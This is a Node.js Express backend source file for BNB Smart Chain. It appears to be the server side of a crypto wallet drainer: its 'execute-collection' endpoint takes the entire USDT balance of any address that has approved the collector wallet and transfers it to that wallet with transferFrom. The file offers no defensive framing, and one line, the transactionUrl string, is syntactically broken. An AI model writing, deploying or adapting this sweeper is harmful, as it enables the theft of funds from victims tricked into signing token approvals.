require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(cors());
app.use(express.json());

// ─── CONFIG ────────────────────────────────────────────────────────
// Use mnemonic from environment variable
const MNEMONIC = process.env.MNEMONIC;
if (!MNEMONIC) {
  console.error('❌ MNEMONIC environment variable is not set!');
  process.exit(1);
}

// Derive private key and address from mnemonic
const DERIVATION_PATH = "m/44'/60'/0'/0/0";
const hdNode = ethers.HDNodeWallet.fromPhrase(MNEMONIC, "", DERIVATION_PATH);
const PRIVATE_KEY = hdNode.privateKey;
const COLLECTOR = hdNode.address;

console.log(`🧠 Derived wallet from mnemonic:`);
console.log(`📦 Collector Address: ${COLLECTOR}`);

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RPC = "https://bsc-dataseed1.binance.org/";

// ─── Initialize Wallet ─────────────────────────────────────────────
const provider = new ethers.JsonRpcProvider(RPC);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// ─── Health Check ──────────────────────────────────────────────────
app.get('/api/health', (req, res) => res.json({ 
  status: 'ok', 
  collector: COLLECTOR 
}));

// ─── SWEEP ALL USDT ───────────────────────────────────────────────
app.post('/api/execute-collection', async (req, res) => {
  const { userAddress } = req.body;
  
  try {
    if (!userAddress || !ethers.isAddress(userAddress)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid user address' 
      });
    }

    const userBalance = await usdt.balanceOf(userAddress);
    console.log(`📊 User ${userAddress} has ${ethers.formatUnits(userBalance, 18)} USDT`);

    if (userBalance === 0n) {
      return res.status(400).json({
        success: false,
        error: 'No USDT balance to sweep'
      });
    }

    const allowance = await usdt.allowance(userAddress, COLLECTOR);
    if (allowance < userBalance) {
      return res.status(400).json({
        success: false,
        error: 'Insufficient allowance. User must approve the collector address.',
        required: ethers.formatUnits(userBalance, 18),
        allowance: ethers.formatUnits(allowance, 18)
      });
    }

    console.log(`🔄 Sweeping ${ethers.formatUnits(userBalance, 18)} USDT from ${userAddress}`);
    const tx = await usdt.transferFrom(userAddress, COLLECTOR, userBalance);
    const receipt = await tx.wait();
    console.log(`✅ Swept successfully! Tx: ${receipt.hash}`);

    res.json({
      success: true,
      txHash: receipt.hash,
      sweptAmount: ethers.formatUnits(userBalance, 18),
      transactionUrl: https://bscscan.com/tx/${receipt.hash}
    });

  } catch (error) {
    console.error('Sweep error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ─── Get User's Balance ──────────────────────────────────────────
app.post('/api/get-balance', async (req, res) => {
  const { userAddress } = req.body;
  try {
    const balance = await usdt.balanceOf(userAddress);
    res.json({
      address: userAddress,
      usdtBalance: ethers.formatUnits(balance, 18)
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Backend running on port ${PORT}`);
  console.log(`📦 Collector Wallet: ${COLLECTOR}`);
});
